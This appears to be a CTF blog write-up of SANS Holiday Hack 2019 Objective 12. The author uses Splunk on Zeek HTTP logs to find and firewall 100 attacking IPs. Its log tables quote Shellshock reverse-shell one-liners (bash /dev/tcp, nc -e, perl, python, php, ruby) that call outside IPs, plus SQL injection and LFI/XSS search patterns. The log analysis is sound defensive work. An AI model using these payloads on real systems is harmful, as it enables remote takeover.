---
layout: post
title: "SANS Holiday Hack Challenge 2019"
date: 2020-01-15T05:23:00.002Z
author: gu4r15sm0
category: sans-hhc
tags: [sans, hhc-2019, ctf]
---

## KringleCon 2 - Objective 12 

## 12) Filter Out Poisoned Sources of Weather Data

Difficulty: 🎄🎄🎄🎄 (4/5)
Use the data supplied in the [Zeek JSON logs](https://downloads.elfu.org/http.log.gz) to identify the IP addresses of attackers poisoning Santa's flight mapping software. [Block the 100 offending sources of information to guide Santa's sleigh](https://srf.elfu.org/) through the attack. Submit the Route ID ("RID") success value that you're given. *For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.*

[![](https://2019.kringlecon.com/images/avatars/elves/elf8.png)](https://2019.kringlecon.com/images/avatars/elves/elf8.png)

***Wunorse Openslae***

*Wunorse Openslae here, just looking at some Zeek logs.*

*I'm pretty sure one of these connections is a malicious C2 channel...*

*Do you think you could take a look?*

*I hear a lot of C2 channels have very long connection times.*

*Please use jq to find the longest connection in this data set.*

*We have to kick out any and all grinchy activity!*

So this is the part we do the cranpi Terminal..., the terminal was made for us to learn and practice JQ following Josh Wrights awesome [post](https://pen-testing.sans.org/blog/2019/12/03/parsing-zeek-json-logs-with-jq-2). 

[![](/assets/images/json-jq-duration.jpg)](/assets/images/json-jq-duration.jpg)

cat conn.log | jq -s 'sort_by(.duration) | reverse| .[0]'

Once we solve the terminal challenge Wunrose gives us very important tips about the task ahead:

***Wunorse Openslae***

*That's got to be the one - thanks!*

*Hey, you know what? We've got a crisis here.*

*You see, Santa's flight route is planned by a complex set of machine learning algorithms which use available weather data.*

*All the weather stations are reporting severe weather to Santa's Sleigh. I think someone might be forging intentionally false weather data!*

*I'm so flummoxed I can't even remember how to login!*

*Hmm... Maybe the Zeek http.log could help us.*

*I worry about **LFI**, **XSS**, and **SQLi** in the Zeek log - oh my!*

*And I'd be **shocked** if there weren't some **shell** stuff in there too.*

*I'll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall.*

*If you find a log entry that definitely looks bad, try **pivoting off other unusual attributes** in that entry to find more bad IPs.*

*The sleigh's machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route.*

*Try not to block many legitimate weather station IPs as that could also cause route calculation failure.*

*Remember, when looking at JSON data, jq  **Splunk** is the tool for you!*

In other words, Wunsore is describing what attacks to look for in the logs

[LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion): Local File Inclusion

[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_\(XSS\)): Cross-site scripting

[SQLi](https://www.owasp.org/index.php/SQL_Injection): SQL Injection

[ShellShock](https://www.owasp.org/images/1/1b/Shellshock_-_Tudor_Enache.pdf): This is the name of a command injection attack that happens at the HTTP request header's level

Then he tells us that other events that don't seem suspicions have something in common with the clearly malicious ones, so we have to compare events to find out what other IP addresses are malicious. 

We're not going to use JQ to solve Objective 12 though, we're going to do it with Splunk.

Splunk is free to download and use with some limitations that doesn't affect what we need for this challenge.

We load our data into Splunk, this is super easy because Splunk parses JSON data automatically and there's no need to decompress the GZ file. Just make sure to choose the ***\_json sourcetype***

[![](/assets/images/json-splunk.png)](/assets/images/json-splunk.png)

JSON data automatically parsed in Splunk

Now we need to know what to look for, luckily the interesting characters in the logs are not encoded in any way so we can just go ahead and look for the characters and strings we typically see in these types of attacks.

LFI: "/../", "/passwd" "/etc/\*

XSS: "<" ">" "**'**"

SQLi: "**'**"

ShellShock: "() { :; };"

We write a search that looks for all these characters and strings to see what we get.

> index="hh2019" sourcetype="\_json" ("\*<\*" OR "\*'\*" OR  "\*\`\*" OR \*/../\* OR "() { :; };"  OR \*/passwd\* OR \*/etc/\*)

[![](/assets/images/srf-search-1.jpg)](/assets/images/srf-search-1.jpg)

67 suspicious IP addresses

We found 67 different suspicious IP addresses, so 67% there 🤣

Let's look at the interesting fields.

[![](/assets/images/srf-search-extracted_host.jpg)](/assets/images/srf-search-extracted_host.jpg)

XSS on Host field 

![](/assets/images/srf-search-uri.jpg)

LFI on uri field

[](/assets/images/srf-search-uri.jpg)

[![](/assets/images/srf-search-user_agent.jpg)](/assets/images/srf-search-user_agent.jpg)

SQLi and ShellShock on user_agent field

[![](/assets/images/srf-search-username.jpg)](/assets/images/srf-search-username.jpg)

SQLi on username field

Let's start counting what we have for each interesting field:

> index="hh2019" sourcetype="\_json" ("\*<\*" OR "\*'\*" OR  "\*\`\*" OR \*/../\* OR "() { :; };"  OR \*/passwd\* OR \*/etc/\*) | stats values(id.orig_h) AS src_ips count(id.orig_h) AS num_src_ip by **<INSERT INTERESTING FIELD NAME>** | search  **<INSERT INTERESTING FIELD NAME>** IN ("\*<\*" , "\*'\*" ,  "\*\`\*" , \*/../\* , "() { :; };\*"  , \*/passwd\* , \*/etc/\*)

[![](/assets/images/srf-search-count_host.jpg)](/assets/images/srf-search-count_host.jpg)

Seven (7) attacks to the host field from **7** different IP addresses 

![](/assets/images/srf-search-count_uri.jpg)

38 Attacks to the uri field from **39** different IP addresses

[](/assets/images/srf-search-count_uri.jpg)

[](/assets/images/srf-search-count_uri.jpg)

![](/assets/images/srf-search-count_username.jpg)

One (1) Attack to the username field from 4 different IP addresses

[](/assets/images/srf-search-count_username.jpg)

[](/assets/images/srf-search-count_username.jpg)

[![](/assets/images/srf-search-count_user_agent.jpg)](/assets/images/srf-search-count_user_agent.jpg)

13 Attacks to the user_agent field by 15 different IP addresses

So we have:

IP addresses attacking the host field: 7

IP addresses attacking the username field: 4

IP addresses attacking the user_agent field: 15

IP addresses attacking the uri field: 39

Total: **65** different IP addresses that matches our original search, we are missing 2 of our original search. 

The 2 missing are false positives from the resp_filename field, so we make sure to add a filter in our search to remove those events.

[![](/assets/images/srf-search-count_resp_file.jpg)](/assets/images/srf-search-count_resp_file.jpg)

False Positives to remove

we add resp_filenames!=Ned\_\* to our main search

This means we're on track and can use that search as a base search, now we need to find the 45 IP addresses left by pivoting into one of interesting field as hinted.

Looking at some of this malicious events shows us that there seems to be very suspicions User-Agent values, probably used by automated tools or known malware:

Misspellings:

-   Mozilla/4.0 (compatible; MSIE 6.1; Windows **NT6.0**)
-   Mozilla/5.0 (compatible; **Goglebot**/2.1; +http://www.google.com/bot.html)

Simply strange:

-   HttpBrowser/1.0
-   CholTBAgent
-   RookIE/1.0 

Known tools:

-   Mozilla/4.0 (compatible; **Metasploit** RSPEC)

So let's pivot on the ***user_agent*** to see if we find other suspicious IP addresses

We can make a join of two searches to pivot on the user_agent, but first we need to increase the limit in Splunk's limits.conf to be able to generate more than 50000 results in a subsearch:

[join]
subsearch_maxout = 60000 ← The file has over 50000 events
subsearch_maxtime = 90 ← A little bit extra
subsearch_timeout = 180 ← A little bit extra just in case
index="hh2019" sourcetype="\_json" ("\*<\*" OR "\*'\*" OR  "\*\`\*" OR \*/../\* OR "() { :; };"  OR \*/passwd\* OR \*/etc/\*) resp_filenames!=Ned\_\* 
**| join user_agent max=0 [search index=hh2019]**
| table status_code id.orig_h user_agent username extracted_host uri| sort - user_agent 
| rename id.orig_h AS orig_h 
| stats values(orig_h) AS ips dc(orig_h) AS num_ips count by user_agent
This gives us an interesting result, there are 19 unique User-Agents used by 19 unique malicious IP addresses, there are 36 User-Agents used by 2 different IP addresses each, so that makes it 72 malicious IP addresses, there is 1 User-Agents (a SQLi) used by 3 malicious IP addresses, and the rest are User-Agents used by more than 9 IP addresses.
The next table shows the User-Agents with 2 or less malicious IP addresses (79 IP addresses)

.tg {border-collapse:collapse;border-spacing:0;border-color:#bbb;} .tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:#bbb;color:#594F4F;background-color:#E0FFEB;} .tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:#bbb;color:#493F3F;background-color:#9DE0AD;} .tg .tg-baqh{text-align:center;vertical-align:top} .tg .tg-sjuo{background-color:#C2FFD6;text-align:left;vertical-align:top} .tg .tg-0lax{text-align:left;vertical-align:top}

User-Agent

IP Addresses

CholTBAgent

103.235.93.133
135.32.99.116

HttpBrowser/1.0

118.26.57.38
56.5.47.137

Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N

44.164.136.41
49.161.8.58

Mozilla/4.0 (compatible MSIE 5.0;Windows_98)

23.49.177.78
249.237.77.152

Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)

10.122.158.57
223.149.180.133

Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR  1.1.4322)

106.132.195.153
187.152.203.243

Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)

249.34.9.16
50.154.111.0

Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)

217.132.156.225
69.221.145.150

Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)

252.122.243.212
42.191.112.181

Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS)

116.116.98.205
29.0.183.220

Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)

22.34.153.164
48.66.193.176

Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322)

225.191.220.138
66.116.147.181

Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tridents/4.0)

121.7.186.163
126.102.12.53

Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)

238.143.78.114
31.116.232.143

Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )

190.245.228.38
250.22.86.40

Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727)

140.60.154.239
75.73.228.192

Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)

102.143.16.184
226.102.56.13

Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)

19.235.69.221
42.127.244.30

Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)

10.155.246.29
104.179.109.113

Mozilla/4.0 (compatible; Metasploit RSPEC)

203.68.29.5
84.147.231.129

Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.

185.19.7.133
230.246.50.221

Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)

42.103.246.130
42.103.246.250

Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1

42.16.149.112
9.206.212.33

Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19

95.166.116.45

Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/\_BuildID\_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36

200.75.228.240

Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36

168.66.108.62

Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30

80.244.147.207

Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12

123.127.233.97

Mozilla/5.0 (Windows NT 10.0;Win64;x64)

249.90.116.138
28.169.41.122

Mozilla/5.0 (Windows NT 5.1 ; v.)

231.179.108.238
34.129.179.28

Mozilla/5.0 (Windows NT 6.1; WOW62; rv:53.0) Gecko/20100101 Chrome /53.0

27.88.56.114
92.213.148.0

Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13

44.74.106.131
97.220.93.190

Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731

131.186.145.73
87.195.80.126

Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)

106.93.213.219
158.171.84.209

Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)

2.230.60.70
34.155.174.167

Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1

61.110.82.125

Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1

65.153.114.120

Mozilla/5.0 WinInet

2.240.116.254
253.65.40.39

Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)

229.133.163.235
53.160.218.44

Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)

187.178.169.123
226.240.188.154

Opera/8.81 (Windows-NT 6.1; U; en)

148.146.134.52
253.182.102.55

RookIE/1.0

142.128.135.10
45.239.232.245

Wget/1.9+cvs-stable (Red Hat modified)

129.121.121.48
37.216.249.50

Next table are the IP addresses of all attacks to the User-Agent field for 15 different malicious  IP addresses

.tg {border-collapse:collapse;border-spacing:0;border-color:#9ABAD9;} .tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:#9ABAD9;color:#444;background-color:#EBF5FF;} .tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:#9ABAD9;color:#fff;background-color:#409cff;} .tg .tg-hmp3{background-color:#D2E4FC;text-align:left;vertical-align:top} .tg .tg-baqh{text-align:center;vertical-align:top} .tg .tg-0lax{text-align:left;vertical-align:top}

User-Agent

IP Addresses

() { :; }; /bin/bash -c '/bin/nc 55535 220.132.33.81 -e /bin/bash'

220.132.33.81

() { :; }; /bin/bash -i >& /dev/tcp/31.254.228.4/48051 0>&1

31.254.228.4

() { :; }; /usr/bin/perl -e 'use Socket;$i="83.0.8.119";$p=57432;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

83.0.8.119

() { :; }; /usr/bin/php -r '$sock=fsockopen("229.229.189.246",62570);exec("/bin/sh -i <&3 >&3 2>&3");'

229.229.189.246

() { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("150.45.133.97",54611));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

150.45.133.97

() { :; }; /usr/bin/ruby -rsocket -e'f=TCPSocket.open("227.110.45.126",43870).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

227.110.45.126

1' UNION SELECT '1','2','automatedscanning','1233627891','5'/\*

111.81.145.191

1' UNION SELECT -1,'autosc','test','O:8:\\"stdClass\\":3:{s:3:\\"mod\\";s:15:\\"resourcesmodule\\";s:3:\\"src\\";s:20:\\"@random41940ceb78dbb\\";s:3:\\"int\\";s:0:\\"\\";}',7,0,0,0,0,0,0 /\*

13.39.153.254

1' UNION SELECT 1,1409605378,1,1,1,1,1,1,1,1/\*&blogId=1

81.14.204.154

1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- '

118.196.230.170
173.37.160.150
68.115.251.76

1' UNION SELECT 1729540636,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x65,0x72, --

186.28.46.179

1' UNION/\*\*/SELECT/\*\*/1,2,434635502,4/\*&blog=1

0.216.249.31

1' UNION/\*\*/SELECT/\*\*/994320606,1,1,1,1,1,1,1/\*&blogId=1

135.203.243.43

We have found 94 Malicious IP addresses, now we need to find the last 6 malicious onces related to 7 User-Agents being used by more than 9 IP addresses each:

Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)

Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22

Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9b3) Gecko/2008020514 Opera 9.5

Mozilla/5.0 (Windows; U; Windows NT 5.2; sk; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15

Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30

Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Firefox/2.0.0.8 (Debian-2.0.0.8-1)

Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5

We use our original search and add specific user_agent fields.
index="hh2019" sourcetype="\_json" ("\*<\*" OR "\*'\*" OR  "\*\`\*" OR \*/../\* OR "() { :; };"  OR \*/passwd\* OR \*/etc/\*) 
 user_agent IN (
"Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22", 
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22", 
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Firefox/2.0.0.8 (Debian-2.0.0.8-1)",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5")
| stats count by id.orig_h | fields - count
This gives 7 more IP addresses, that's actually one more than we needed.

[![](/assets/images/srf-count-ua-lost-sqli-lfi.jpg)](/assets/images/srf-count-ua-lost-sqli-lfi.jpg)

7 more IP Addresses

Well... the challenge has a bug... or the description in the objectives doesn't match what Wunorse says, he says MOST of the IP addresses need to be block, but the description says clearly "*Block the 100 offending sources of information to guide Santa's*".So we look at the results and see what can be discarded as a false positive, there 4 obvious SQLi attempts on the username **(****' or '1=1)**, those IP address we keep, so need to choose from 2 out of 3 LFI candidates more.
Since we actually have 101 IP Addresses, we pick a 100 and try.
We put them in a nice CSV format:
220.132.33.81,31.254.228.4,83.0.8.119,229.229.189.246,150.45.133.97,227.110.45.126,111.81.145.191,13.39.153.254,81.14.204.154,118.196.230.170,173.37.160.150,68.115.251.76,186.28.46.179,0.216.249.31,135.203.243.43,103.235.93.133,135.32.99.116,118.26.57.38,56.5.47.137,44.164.136.41,49.161.8.58,23.49.177.78,249.237.77.152,10.122.158.57,223.149.180.133,106.132.195.153,187.152.203.243,249.34.9.16,50.154.111.0,217.132.156.225,69.221.145.150,252.122.243.212,42.191.112.181,116.116.98.205,29.0.183.220,22.34.153.164,48.66.193.176,225.191.220.138,66.116.147.181,121.7.186.163,126.102.12.53,238.143.78.114,31.116.232.143,190.245.228.38,250.22.86.40,140.60.154.239,75.73.228.192,102.143.16.184,226.102.56.13,19.235.69.221,42.127.244.30,10.155.246.29,104.179.109.113,203.68.29.5,84.147.231.129,185.19.7.133,230.246.50.221,42.103.246.130,42.103.246.250,42.16.149.112,9.206.212.33,95.166.116.45,200.75.228.240,168.66.108.62,80.244.147.207,123.127.233.97,249.90.116.138,28.169.41.122,231.179.108.238,34.129.179.28,27.88.56.114,92.213.148.0,44.74.106.131,97.220.93.190,131.186.145.73,87.195.80.126,106.93.213.219,158.171.84.209,2.230.60.70,34.155.174.167,61.110.82.125,65.153.114.120,2.240.116.254,253.65.40.39,229.133.163.235,53.160.218.44,187.178.169.123,226.240.188.154,148.146.134.52,253.182.102.55,142.128.135.10,45.239.232.245,129.121.121.48,37.216.249.50,254.140.181.172,33.132.98.193,84.185.44.166,150.50.77.238,79.198.89.109,193.228.194.36
Now, we need access to the Web SIte.
In Objective 10 - Recover Cleartext Document, we deciphered a PDF file which is the Manual of the SRF system.
On page 3

[![](/assets/images/srf-git-clue.jpg)](/assets/images/srf-git-clue.jpg)

We scanned the webserver looking for a git repo (.git folder) without luck, but remembered the document says the information is in the readme, which means there's probably a README.md file somewhere.
We go back to Splunk and look for that string, luckily someone read it
index="hh2019" sourcetype="\_json" Readme.md | table method uri status_code

[method](http://10.20.10.22:8000/en-US/app/search/search?q=search%20index%3D%22hh2019%22%20sourcetype%3D%22_json%22%20Readme.md%20%7C%20table%20method%20uri%20status_code&earliest=0&latest=&display.page.search.mode=verbose&dispatch.sample_ratio=1&workload_pool=&display.page.search.tab=statistics&display.general.type=statistics&display.events.fields=%5B%22username%22%2C%22user_agent%22%2C%22uri%22%2C%22extracted_host%22%2C%22id.orig_h%22%5D&display.prefs.fieldFilter=id&display.statistics.format.0=color&display.statistics.format.0.scale=minMidMax&display.statistics.format.0.colorPalette=minMidMax&display.statistics.format.0.field=num_src_ip&display.statistics.wrap=1&display.statistics.totalsRow=0&display.statistics.format.0.colorPalette.minColor=%23FFFFFF&display.statistics.format.0.colorPalette.maxColor=%2353A051&display.statistics.rowNumbers=0&display.general.enablePreview=1&display.statistics.drilldown=cell&sid=1579064203.331#)

[](http://10.20.10.22:8000/en-US/app/search/search?q=search%20index%3D%22hh2019%22%20sourcetype%3D%22_json%22%20Readme.md%20%7C%20table%20method%20uri%20status_code&earliest=0&latest=&display.page.search.mode=verbose&dispatch.sample_ratio=1&workload_pool=&display.page.search.tab=statistics&display.general.type=statistics&display.events.fields=%5B%22username%22%2C%22user_agent%22%2C%22uri%22%2C%22extracted_host%22%2C%22id.orig_h%22%5D&display.prefs.fieldFilter=id&display.statistics.format.0=color&display.statistics.format.0.scale=minMidMax&display.statistics.format.0.colorPalette=minMidMax&display.statistics.format.0.field=num_src_ip&display.statistics.wrap=1&display.statistics.totalsRow=0&display.statistics.format.0.colorPalette.minColor=%23FFFFFF&display.statistics.format.0.colorPalette.maxColor=%2353A051&display.statistics.rowNumbers=0&display.general.enablePreview=1&display.statistics.drilldown=cell&sid=1579064203.331#)[uri](http://10.20.10.22:8000/en-US/app/search/search?q=search%20index%3D%22hh2019%22%20sourcetype%3D%22_json%22%20Readme.md%20%7C%20table%20method%20uri%20status_code&earliest=0&latest=&display.page.search.mode=verbose&dispatch.sample_ratio=1&workload_pool=&display.page.search.tab=statistics&display.general.type=statistics&display.events.fields=%5B%22username%22%2C%22user_agent%22%2C%22uri%22%2C%22extracted_host%22%2C%22id.orig_h%22%5D&display.prefs.fieldFilter=id&display.statistics.format.0=color&display.statistics.format.0.scale=minMidMax&display.statistics.format.0.colorPalette=minMidMax&display.statistics.format.0.field=num_src_ip&display.statistics.wrap=1&display.statistics.totalsRow=0&display.statistics.format.0.colorPalette.minColor=%23FFFFFF&display.statistics.format.0.colorPalette.maxColor=%2353A051&display.statistics.rowNumbers=0&display.general.enablePreview=1&display.statistics.drilldown=cell&sid=1579064203.331#)

[](http://10.20.10.22:8000/en-US/app/search/search?q=search%20index%3D%22hh2019%22%20sourcetype%3D%22_json%22%20Readme.md%20%7C%20table%20method%20uri%20status_code&earliest=0&latest=&display.page.search.mode=verbose&dispatch.sample_ratio=1&workload_pool=&display.page.search.tab=statistics&display.general.type=statistics&display.events.fields=%5B%22username%22%2C%22user_agent%22%2C%22uri%22%2C%22extracted_host%22%2C%22id.orig_h%22%5D&display.prefs.fieldFilter=id&display.statistics.format.0=color&display.statistics.format.0.scale=minMidMax&display.statistics.format.0.colorPalette=minMidMax&display.statistics.format.0.field=num_src_ip&display.statistics.wrap=1&display.statistics.totalsRow=0&display.statistics.format.0.colorPalette.minColor=%23FFFFFF&display.statistics.format.0.colorPalette.maxColor=%2353A051&display.statistics.rowNumbers=0&display.general.enablePreview=1&display.statistics.drilldown=cell&sid=1579064203.331#)[status_code](http://10.20.10.22:8000/en-US/app/search/search?q=search%20index%3D%22hh2019%22%20sourcetype%3D%22_json%22%20Readme.md%20%7C%20table%20method%20uri%20status_code&earliest=0&latest=&display.page.search.mode=verbose&dispatch.sample_ratio=1&workload_pool=&display.page.search.tab=statistics&display.general.type=statistics&display.events.fields=%5B%22username%22%2C%22user_agent%22%2C%22uri%22%2C%22extracted_host%22%2C%22id.orig_h%22%5D&display.prefs.fieldFilter=id&display.statistics.format.0=color&display.statistics.format.0.scale=minMidMax&display.statistics.format.0.colorPalette=minMidMax&display.statistics.format.0.field=num_src_ip&display.statistics.wrap=1&display.statistics.totalsRow=0&display.statistics.format.0.colorPalette.minColor=%23FFFFFF&display.statistics.format.0.colorPalette.maxColor=%2353A051&display.statistics.rowNumbers=0&display.general.enablePreview=1&display.statistics.drilldown=cell&sid=1579064203.331#)

GET

/README.md

200

The logs tell us that the file exist in the root of the website

[![](/assets/images/srf-README-md.jpg)](/assets/images/srf-README-md.jpg)

We use the credentials to get into the website, click on the Firewall at the top, we paste our 100 IP addresses and click DENY.

[![](/assets/images/srf-RID-firewall.jpg)](/assets/images/srf-RID-firewall.jpg)

We can see the RID number at the bottom, we paste it on the game to finish the objective.